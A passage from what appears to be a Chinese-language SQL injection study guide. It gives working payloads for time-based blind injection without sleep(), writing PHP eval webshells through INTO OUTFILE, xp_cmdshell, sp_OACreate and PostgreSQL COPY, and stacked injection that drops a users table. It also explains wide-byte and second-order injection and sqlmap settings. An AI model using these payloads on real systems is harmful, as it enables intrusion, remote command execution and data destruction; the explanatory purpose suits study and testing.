<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 让 MD5(<span class="string">&#x27;a&#x27;</span>) 重复执行 <span class="number">5</span>,<span class="number">000</span>,<span class="number">000</span> 次，从而造成延时</span><br><span class="line"><span class="keyword">AND</span> IF(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>, BENCHMARK(<span class="number">5000000</span>, MD5(<span class="string">&#x27;a&#x27;</span>)), <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><strong>解释:</strong></p>
<ul>
<li><code>IF(condition, true_value, false_value)</code>：这是一个条件判断语句</li>
<li><code>ascii(substr(database(),1,1))=115</code>：这是我们的注入条件，判断数据库名的第一个字符的 ASCII 值是否为 115（即 <code>&#39;s&#39;</code>）</li>
<li>如果条件为真，<code>BENCHMARK()</code> 函数被执行，导致页面延迟；如果条件为假，则立即返回 <code>1</code>，页面没有延迟</li>
</ul>
</li>
</ul>
<p><strong>2. 利用 GET_LOCK() 函数</strong></p>
<p><code>GET_LOCK()</code> 函数是 MySQL 中的一个锁函数。它可以获取一个指定的锁，并在指定的超时时间内等待。如果锁被其他会话占用，它就会一直等待直到超时。我们可以利用这个特性来造成延时</p>
<ul>
<li><p><strong>原理:</strong> <code>GET_LOCK(str, timeout)</code> 函数尝试获取一个名为 <code>str</code> 的锁，并等待 <code>timeout</code> 秒</p>
</li>
<li><p><strong>利用方式:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 如果条件为真，则获取一个名为 <span class="string">&#x27;a&#x27;</span> 的锁并等待 <span class="number">5</span> 秒</span><br><span class="line"><span class="keyword">AND</span> IF(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>, GET_LOCK(<span class="string">&#x27;a&#x27;</span>, <span class="number">5</span>), <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>这种方法的缺点是，如果多个请求同时执行，可能会因为锁竞争而造成不可预知的行为</p>
</li>
</ul>
<p><strong>3. 利用 RLIKE&#x2F;REGEXP 的正则特性</strong></p>
<p>当使用 <code>RLIKE</code> 或 <code>REGEXP</code> 进行正则表达式匹配时，如果正则表达式足够复杂，并且目标字符串足够长，也会造成明显的性能消耗，从而实现延时效果</p>
<ul>
<li><p><strong>原理:</strong> 构造一个回溯（backtracking）量较大的正则表达式，让 MySQL 在匹配时消耗大量 CPU 资源</p>
</li>
<li><p><strong>利用方式:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 构造一个高回溯的正则表达式来消耗 CPU</span><br><span class="line"><span class="keyword">AND</span> IF(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>, (<span class="keyword">SELECT</span> concat(rpad(<span class="string">&#x27;&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="string">&#x27;&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>),<span class="string">&#x27;a&#x27;</span>) RLIKE <span class="string">&#x27;(a.*)+(a.*)+&#x27;</span>), <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><strong>解释:</strong> <code>rpad()</code> 函数用于填充字符串，使其变得很长。<code>RLIKE &#39;(a.*)+(a.*)+&#39;</code> 是一个典型的回溯型正则表达式。当字符串很长时，匹配会非常耗时</p>
</li>
</ul>
<p><strong>4. 利用笛卡尔积</strong></p>
<p>通过制造一个巨大的笛卡尔积，可以使查询的执行时间大大增加</p>
<ul>
<li><p><strong>原理:</strong> 当两个大表没有关联地进行连接时，结果集的行数是两个表行数的乘积</p>
</li>
<li><p><strong>利用方式:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用 information_schema.tables 来制造一个笛卡尔积</span><br><span class="line"><span class="keyword">AND</span> IF(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>, (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.tables a, information_schema.columns b), <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>这种方法同样会造成明显的延迟，但查询结果可能会占用大量内存</p>
</li>
</ul>
<hr>
<h3 id="SQL-延时盲注-sleep-被禁用怎么绕过-1"><a href="#SQL-延时盲注-sleep-被禁用怎么绕过-1" class="headerlink" title="SQL 延时盲注 sleep() 被禁用怎么绕过"></a>SQL 延时盲注 sleep() 被禁用怎么绕过</h3><p><strong>1. 利用 BENCHMARK() 函数</strong></p>
<p><code>BENCHMARK()</code> 函数是 MySQL 中一个非常有用的性能测试函数。它的作用是让一个函数重复执行多次，并返回执行时间。我们可以利用这个特性来造成可控的延时</p>
<ul>
<li><p><strong>原理:</strong> <code>BENCHMARK(count, expr)</code> 会让 <code>expr</code> 表达式执行 <code>count</code> 次。如果我们让它执行一个耗时但无害的操作，就可以造成明显的延时</p>
</li>
<li><p><strong>基本语法:</strong> <code>BENCHMARK(count, expr)</code></p>
</li>
<li><p><strong>利用方式:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 让 MD5(<span class="string">&#x27;a&#x27;</span>) 重复执行 <span class="number">5</span>,<span class="number">000</span>,<span class="number">000</span> 次，从而造成延时</span><br><span class="line"><span class="keyword">AND</span> IF(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>, BENCHMARK(<span class="number">5000000</span>, MD5(<span class="string">&#x27;a&#x27;</span>)), <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><strong>解释:</strong></p>
<ul>
<li><code>IF(condition, true_value, false_value)</code>：这是一个条件判断语句</li>
<li><code>ascii(substr(database(),1,1))=115</code>：这是我们的注入条件，判断数据库名的第一个字符的 ASCII 值是否为 115（即 <code>&#39;s&#39;</code>）</li>
<li>如果条件为真，<code>BENCHMARK()</code> 函数被执行，导致页面延迟；如果条件为假，则立即返回 <code>1</code>，页面没有延迟</li>
</ul>
</li>
</ul>
<p><strong>2. 利用 GET_LOCK() 函数</strong></p>
<p><code>GET_LOCK()</code> 函数是 MySQL 中的一个锁函数。它可以获取一个指定的锁，并在指定的超时时间内等待。如果锁被其他会话占用，它就会一直等待直到超时。我们可以利用这个特性来造成延时</p>
<ul>
<li><p><strong>原理:</strong> <code>GET_LOCK(str, timeout)</code> 函数尝试获取一个名为 <code>str</code> 的锁，并等待 <code>timeout</code> 秒</p>
</li>
<li><p><strong>利用方式:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 如果条件为真，则获取一个名为 <span class="string">&#x27;a&#x27;</span> 的锁并等待 <span class="number">5</span> 秒</span><br><span class="line"><span class="keyword">AND</span> IF(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>, GET_LOCK(<span class="string">&#x27;a&#x27;</span>, <span class="number">5</span>), <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>这种方法的缺点是，如果多个请求同时执行，可能会因为锁竞争而造成不可预知的行为</p>
</li>
</ul>
<p><strong>3. 利用 RLIKE&#x2F;REGEXP 的正则特性</strong></p>
<p>当使用 <code>RLIKE</code> 或 <code>REGEXP</code> 进行正则表达式匹配时，如果正则表达式足够复杂，并且目标字符串足够长，也会造成明显的性能消耗，从而实现延时效果</p>
<ul>
<li><p><strong>原理:</strong> 构造一个回溯（backtracking）量较大的正则表达式，让 MySQL 在匹配时消耗大量 CPU 资源</p>
</li>
<li><p><strong>利用方式:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 构造一个高回溯的正则表达式来消耗 CPU</span><br><span class="line"><span class="keyword">AND</span> IF(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>, (<span class="keyword">SELECT</span> concat(rpad(<span class="string">&#x27;&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="string">&#x27;&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>),<span class="string">&#x27;a&#x27;</span>) RLIKE <span class="string">&#x27;(a.*)+(a.*)+&#x27;</span>), <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><strong>解释:</strong> <code>rpad()</code> 函数用于填充字符串，使其变得很长。<code>RLIKE &#39;(a.*)+(a.*)+&#39;</code> 是一个典型的回溯型正则表达式。当字符串很长时，匹配会非常耗时</p>
</li>
</ul>
<p><strong>4. 利用笛卡尔积</strong></p>
<p>通过制造一个巨大的笛卡尔积，可以使查询的执行时间大大增加</p>
<ul>
<li><p><strong>原理:</strong> 当两个大表没有关联地进行连接时，结果集的行数是两个表行数的乘积</p>
</li>
<li><p><strong>利用方式:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用 information_schema.tables 来制造一个笛卡尔积</span><br><span class="line"><span class="keyword">AND</span> IF(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>, (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.tables a, information_schema.columns b), <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>这种方法同样会造成明显的延迟，但查询结果可能会占用大量内存</p>
</li>
</ul>
<hr>
<h3 id="SQL-注入怎么写入-WebShell"><a href="#SQL-注入怎么写入-WebShell" class="headerlink" title="SQL 注入怎么写入 WebShell"></a>SQL 注入怎么写入 WebShell</h3><p>这种攻击方式的成功与否，主要取决于以下几个前提条件：</p>
<ul>
<li><strong>数据库账户权限</strong>：当前连接数据库的账户必须具备 <code>File</code> 权限，或者说有权限执行 <code>LOAD_FILE()</code>、<code>INTO OUTFILE</code> 或 <code>INTO DUMPFILE</code> 等文件操作函数</li>
<li><strong>目标路径可写</strong>：网站服务器上的目标路径必须是可写的，且不能被权限系统限制</li>
<li><strong>WAF 或防护软件</strong>：没有强大的 WAF (Web Application Firewall) 或其他安全软件拦截注入语句</li>
</ul>
<p><strong>1. MySQL：<code>INTO OUTFILE</code></strong></p>
<p>这是最常用且最直接的写入 WebShell 的方法。<code>INTO OUTFILE</code> 语句能够将查询结果导出到一个指定的文件中</p>
<p><strong>利用步骤：</strong></p>
<ol>
<li><p><strong>判断权限</strong>：首先，需要判断当前数据库用户是否具有 <code>File</code> 权限。可以尝试执行以下语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (SELECT count(*) FROM mysql.user)&gt;0--+</span></span><br></pre></td></tr></table></figure>

<p>如果返回正常，则可以初步判断有权限。更直接的方式是尝试利用 <code>@@basedir</code> 或 <code>@@datadir</code> 查看路径是否可写</p>
</li>
<li><p><strong>获取网站绝对路径</strong>：如果不知道网站的绝对路径，可以尝试利用报错或联合查询来获取</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 利用报错获取</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (SELECT 1 FROM (SELECT count(*), concat(@@basedir,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+</span></span><br></pre></td></tr></table></figure>

<p>或者尝试猜测一些常见的路径，例如 <code>/var/www/html/</code>、<code>C:/inetpub/wwwroot/</code> 等</p>
</li>
<li><p><strong>构造注入语句</strong>：将包含 WebShell 代码的字符串作为查询结果，然后使用 <code>INTO OUTFILE</code> 导出到目标路径</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 假设我们想写入一个名为 shell.php 的文件</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; UNION SELECT 1, &#x27;</span><span class="operator">&lt;</span>?php eval($_POST[cmd]);?<span class="operator">&gt;</span><span class="string">&#x27; INTO OUTFILE &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong></p>
<ul>
<li><code>INTO OUTFILE</code> 导出时会以行的形式输出，每行末尾会有换行符，且不能覆盖已有文件。为了解决这个问题，通常会结合十六进制编码或 <code>LOAD_FILE()</code> 来绕过</li>
<li>为了避免转义和换行问题，WebShell 代码通常会用十六进制进行编码</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; UNION SELECT 1, 0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e INTO OUTFILE &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>2. SQL Server：<code>xp_cmdshell</code></strong></p>
<p><code>xp_cmdshell</code> 是 SQL Server 的一个扩展存储过程，它允许在数据库中执行操作系统命令。如果它被启用，攻击者就可以直接执行命令来写入 WebShell</p>
<h4 id="利用步骤："><a href="#利用步骤：" class="headerlink" title="利用步骤："></a><strong>利用步骤：</strong></h4><ol>
<li><p><strong>判断 <code>xp_cmdshell</code> 是否启用</strong>：默认情况下，<code>xp_cmdshell</code> 是禁用的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;dir c:&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>如果执行成功，说明已启用。如果没有，则需要尝试启用它</p>
</li>
<li><p><strong>启用 <code>xp_cmdshell</code></strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>; RECONFIGURE; <span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>; RECONFIGURE<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> 启用 <code>xp_cmdshell</code> 需要较高的权限（通常是 <code>sysadmin</code> 角色）</p>
</li>
<li><p><strong>写入 WebShell</strong>：启用 <code>xp_cmdshell</code> 后，可以使用 <code>echo</code> 命令将 WebShell 代码写入文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;echo ^&lt;^?php eval($_POST[cmd])?^&gt; &gt; C:\inetpub\wwwroot\shell.asp&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><code>^</code> 是为了转义特殊字符 <code>&lt;</code>、<code>&gt;</code> 等</p>
</li>
</ol>
<p><strong>3. SQL Server：<code>sp_OACreate</code></strong></p>
<p>如果 <code>xp_cmdshell</code> 被禁用，攻击者还可以利用 <code>sp_OACreate</code> 等 OLE 自动化存储过程来执行命令</p>
<ul>
<li><p><strong>利用方式</strong>：利用 <code>sp_OACreate</code> 创建一个 <code>WScript.Shell</code> 对象，然后通过其 <code>Run</code> 方法执行命令</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">DECLARE</span> <span class="variable">@o</span> <span class="type">INT</span>; <span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;WScript.Shell&#x27;</span>, <span class="variable">@o</span> <span class="keyword">OUT</span>; <span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@o</span>, <span class="string">&#x27;Run&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;cmd.exe /c echo ^&lt;^?php eval($_POST[cmd])?^&gt; &gt; C:\inetpub\wwwroot\shell.asp&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>4. PostgreSQL：<code>COPY TO</code></strong></p>
<p>PostgreSQL 提供了 <code>COPY TO</code> 命令，用于将表数据导出到文件中</p>
<ul>
<li><p><strong>利用方式</strong>：</p>
<ol>
<li>创建一个临时表，并将 WebShell 代码插入其中</li>
<li>利用 <code>COPY TO</code> 命令将数据导出到目标文件</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; CREATE TABLE shell (cmd text); INSERT INTO shell VALUES (&#x27;</span><span class="operator">&lt;</span>?php eval($_POST[cmd]);?<span class="operator">&gt;</span><span class="string">&#x27;); COPY shell TO &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php<span class="string">&#x27;;--</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> 执行 <code>COPY</code> 命令需要 <code>superuser</code> 权限，且目标路径必须是数据库服务器可读写的</p>
</li>
</ul>
<hr>
<h3 id="宽字节注入漏洞原理"><a href="#宽字节注入漏洞原理" class="headerlink" title="宽字节注入漏洞原理"></a>宽字节注入漏洞原理</h3><p>我们通过一个经典的例子来解释这个漏洞</p>
<p>假设一个 PHP 应用在接收用户输入后，使用了 <code>addslashes()</code> 或 <code>mysql_real_escape_string()</code> 等函数来对单引号进行转义</p>
<p><strong>正常情况下的过滤：</strong></p>
<p>当用户输入 <code>&#39;</code>（单引号）时，后端会被转义成 <code>\&#39;</code></p>
<ul>
<li><strong>输入：</strong> <code>id=1&#39;</code></li>
<li><strong>转义后：</strong> <code>id=1\&#39;</code></li>
<li><strong>SQL 查询：</strong> <code>SELECT * FROM users WHERE id = &#39;1\&#39;&#39;</code></li>
</ul>
<p>这句 SQL 语句是合法的，因为 <code>\&#39;</code> 被视为一个转义后的单引号，从而导致查询失败，注入被阻止</p>
<p><strong>宽字节注入的绕过：</strong></p>
<p>当后端数据库使用 GBK 编码时，我们可以利用一个特殊字符来“吃掉”转义符 <code>\</code></p>
<ul>
<li><p><strong>输入：</strong> 我们在单引号前加一个十六进制的宽字节，例如 <code>%df</code></p>
</li>
<li><p><strong>完整的输入：</strong> <code>id=1%df&#39;</code></p>
</li>
<li><p><strong>URL解码后：</strong> <code>id=1&#39;</code> （这里 <code></code> 是 <code>0xdf</code> 的GBK编码，具体字符取决于浏览器）</p>
</li>
<li><p><strong><code>addslashes()</code> 处理后：</strong> <code>addslashes()</code> 只会将单引号 <code>&#39;</code> 转义成 <code>\&#39;</code>。 此时，字符串变为 <code>1%df\&#39;</code></p>
<ul>
<li><strong>在内存中，它的十六进制表示是：</strong> <code>31 25 64 66 5c 27</code></li>
<li><strong>但在GBK编码环境下，数据库会重新解释这个字符串</strong></li>
</ul>
<p>MySQL 在接收到这个字符串时，会把它当作 GBK 编码进行解析。它会发现 <code>%df</code>（<code>0xdf</code>）是一个宽字节的开头，并且紧接着的 <code>\</code>（<code>0x5c</code>）恰好在GBK编码的合法范围内，可以和 <code>0xdf</code> 组成一个合法的汉字</p>
<ul>
<li><strong><code>%df%5c</code></strong> (<code>0xdf</code> 和 <code>0x5c</code>) 在GBK编码中是一个合法的汉字，例如“運”</li>
<li><strong>结果：</strong> <code>1%df\&#39;</code> 在数据库看来就变成了 <code>1</code> + <strong>一个汉字</strong> + <code>&#39;</code></li>
</ul>
</li>
<li><p><strong>最终的 SQL 查询：</strong> <code>SELECT * FROM users WHERE id = &#39;1運&#39;&#39;</code></p>
<p>此时，被转义的单引号 <code>&#39;</code> 重新获得了生命，因为它不再被认为是转义符的一部分。攻击者就可以继续使用后面的单引号进行SQL注入</p>
</li>
</ul>
<hr>
<h3 id="二次注入漏洞原理"><a href="#二次注入漏洞原理" class="headerlink" title="二次注入漏洞原理"></a>二次注入漏洞原理</h3><p>我们通过一个经典的案例来解释这个过程</p>
<p>假设有一个网站，允许用户注册并修改个人信息，其中包含用户名</p>
<p><strong>第一阶段：数据注入</strong></p>
<ol>
<li><strong>用户注册</strong>：注册时，应用对用户名进行了严格的过滤，阻止了单引号和一些 SQL 关键字</li>
<li><strong>攻击者构造恶意用户名</strong>：攻击者注册一个名为 <code>test&#39; and 1=1--</code> 的账户。由于注册时的过滤机制，攻击者无法直接注入</li>
<li><strong>攻击者换一种方式</strong>：攻击者注册一个名为 <code>test</code> 的账户。然后，在修改用户名的功能中，他将用户名修改为 <code>test&#39; and 1=1--</code></li>
<li><strong>应用处理</strong>：假设应用在<strong>更新操作</strong>时对用户输入做了严格的过滤，但数据库中的<strong>新增操作</strong>没有。攻击者在第一次新增时，输入一个看似无害的用户名，例如 <code>test</code></li>
</ol>
<p><strong>漏洞的真正利用</strong>：</p>
<p>现在，假设应用有一个功能，允许用户修改自己的个人信息，而这个功能在设计时存在缺陷</p>
<ul>
<li><p><strong>正常的修改用户信息 SQL 语句</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> email <span class="operator">=</span> <span class="string">&#x27;user@example.com&#x27;</span> <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>攻击者如何利用</strong>：</p>
<ol>
<li><strong>第一次注入</strong>：攻击者注册一个名为 <code>test</code> 的账户。这个数据被安全地存储在数据库中</li>
<li><strong>第二次注入</strong>：攻击者找到一个功能，例如“修改评论”，而这个功能会将评论内容与用户名关联起来。假设评论表是 <code>comments</code>，并且 <code>username</code> 列没有做任何过滤</li>
</ol>
<p>攻击者提交了一条评论，内容为 <code>&#39; or 1=1--</code>。数据库执行了如下语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> comments (username, content) <span class="keyword">VALUES</span> (<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>此时，恶意数据 <code>&#39; or 1=1--</code> 被安全地存储在了 <code>comments</code> 表中</p>
<ol>
<li><strong>触发漏洞</strong>：现在，应用中有一个<strong>管理员审核评论</strong>的功能。管理员点击审核按钮后，后端会执行一个不安全的查询，例如：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> comments <span class="keyword">WHERE</span> content <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>这条查询语句由于没有对 <code>content</code> 字段进行二次过滤，导致 <code>or 1=1--</code> 被当作 SQL 语句的一部分，从而绕过了原本的逻辑，直接获取了 <code>comments</code> 表中的所有数据，甚至可以被进一步利用进行数据泄露或篡改</p>
</li>
</ul>
<hr>
<h3 id="堆叠注入漏洞原理"><a href="#堆叠注入漏洞原理" class="headerlink" title="堆叠注入漏洞原理"></a>堆叠注入漏洞原理</h3><p><strong>正常查询</strong></p>
<p>假设一个网站的查询语句是这样拼接的：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;用户输入&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>如果用户输入 <code>1</code>，执行的 SQL 语句就是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>堆叠注入攻击</strong></p>
<p>如果攻击者在输入框中输入 <code>1; DROP TABLE users</code>，并且后端没有过滤分号，最终执行的 SQL 语句就会变成：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> users;</span><br></pre></td></tr></table></figure>

<p>数据库服务器会按顺序执行这两条语句。第一条是正常的查询，第二条则是<strong>删除 <code>users</code> 表</strong>的恶意命令</p>
<hr>
<h3 id="SQLMap-参数-level-与-risk-区别"><a href="#SQLMap-参数-level-与-risk-区别" class="headerlink" title="SQLMap 参数 level 与 risk 区别"></a>SQLMap 参数 level 与 risk 区别</h3><p><strong>level (探测等级)</strong></p>
<p><code>level</code> 选项用于指定 <code>sqlmap</code> <strong>测试的深度</strong>，范围从1到5。<code>level</code> 值越高，<code>sqlmap</code> 会尝试更多的 Payload，但同时也会增加请求的数量和测试时间</p>
<ul>
<li><strong>Level 1</strong>：默认等级，会测试一些基本的 Payload，比如单引号 <code>&#39;</code> 和双引号 <code>&quot;</code>。这适用于快速探测，通常不会对应用造成太大影响</li>
<li><strong>Level 2</strong>：会增加基于时间的 Payload，用于测试盲注</li>
<li><strong>Level 3</strong>：会测试 <code>AND/OR</code> 布尔盲注以及一些常见的报错注入 Payload</li>
<li><strong>Level 4</strong>：会测试一些不常见的、复杂的 Payload，例如基于 <code>UNION</code> 查询的 Payload</li>
<li><strong>Level 5</strong>：最高等级，会测试所有的 Payload，包括一些非常规的、可能导致应用崩溃的 Payload</li>
</ul>
<p><strong>总结</strong>：<code>level</code> 决定了 <code>sqlmap</code> 攻击的<strong>深度和复杂性</strong>，它告诉 <code>sqlmap</code> <strong>应该使用多少种不同的技术</strong>来探测漏洞</p>
<p><strong>risk (危险等级)</strong></p>
<p><code>risk</code> 选项用于指定 <code>sqlmap</code> <strong>执行 Payload 的危险程度</strong>，范围从1到3。<code>risk</code> 值越高，<code>sqlmap</code> 会使用一些可能对数据库<strong>造成修改或破坏</strong>的 Payload</p>
<ul>
<li><strong>Risk 1</strong>：默认等级，<code>sqlmap</code> 只会使用那些不会对数据库数据造成修改的 Payload。例如，<code>UNION</code> 查询、布尔盲注等</li>
<li><strong>Risk 2</strong>：会增加一些可能造成轻微数据修改的 Payload，比如<strong>基于 <code>GET</code> 或 <code>POST</code> 参数的更新语句</strong></li>
<li><strong>Risk 3</strong>：最高等级，会尝试<strong>可能对数据库造成重大破坏</strong>的 Payload，例如 <code>DELETE</code>、<code>INSERT</code> 和 <code>UPDATE</code> 等。在没有明确授权的情况下，不建议使用这个等级</li>
</ul>
<p><strong>总结</strong>：<code>risk</code> 决定了 <code>sqlmap</code> 攻击的<strong>潜在危害性</strong>，它告诉 <code>sqlmap</code> <strong>可以执行多“危险”的操作</strong></p>
<table>
<thead>
<tr>
<th>特征</th>
<th>level (探测等级)</th>
<th>risk (危险等级)</th>
</tr>
</thead>
<tbody><tr>
<td>关注点</td>
<td>攻击深度和技术类型</td>
<td>攻击危险性和破坏程度</td>
</tr>
<tr>
<td>决定因素</td>
<td>攻击手法（布尔、时间、报错、联合等）</td>
<td>攻击操作（查询、更新、删除等）</td>
</tr>
<tr>
<td>默认值</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>常用组合</td>
<td>level 3 或更高</td>
<td>risk 2 或更高</td>
</tr>
</tbody></table>
<hr>
<h3 id="MySQL-提权方式有哪些"><a href="#MySQL-提权方式有哪些" class="headerlink" title="MySQL 提权方式有哪些"></a>MySQL 提权方式有哪些</h3><p><strong>1. UDF 提权（User-Defined Function）</strong></p>
<p>UDF 提权是 MySQL 提权最常见且最有效的方式之一。它利用了 MySQL 允许用户通过 C&#x2F;C++ 编写自定义函数并加载到数据库中执行的特性</p>
<ul>
<li><p><strong>前提条件：</strong></p>
<ul>
<li><strong>高权限</strong>：当前 MySQL 用户账户必须具备 <code>CREATE FUNCTION</code> 和 <code>FILE</code> 权限</li>
<li><strong>可写目录</strong>：需要将恶意 UDF 库文件（<code>.dll</code> 或 <code>.so</code>）写入到 MySQL 插件目录中</li>
</ul>
</li>
<li><p><strong>攻击步骤：</strong></p>
<ol>
